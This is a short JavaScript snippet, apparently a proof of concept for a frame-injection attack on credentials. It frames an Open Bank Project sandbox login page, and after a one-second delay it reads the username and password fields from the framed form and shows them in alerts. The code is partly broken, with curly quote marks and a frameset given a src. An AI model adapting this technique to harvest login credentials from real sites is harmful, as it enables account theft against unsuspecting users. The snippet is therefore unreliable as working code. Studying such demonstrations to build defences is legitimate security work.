var frameset = document.createElement(‘frameset’); 
var frame1 = document.createElement(‘frame’); 
frameset.src = "https://apisandbox.openbankproject.com/user_mgt/login";
frameset.style.width = "640px";
frameset.style.height = "480px";
document.body.appendChild(frameset);
frame1.setAttribute(‘src’,’login.php’); 
frameset.appendChild(frame1);

setTimeout(showLogin,1000);

function showLogin() 
{ 
     var user = parent.frames[0].document.forms[0].elements[0].value;
     var pass = parent.frames[0].document.forms[0].elements[1].value;
alert(user);
alert(pass);
}
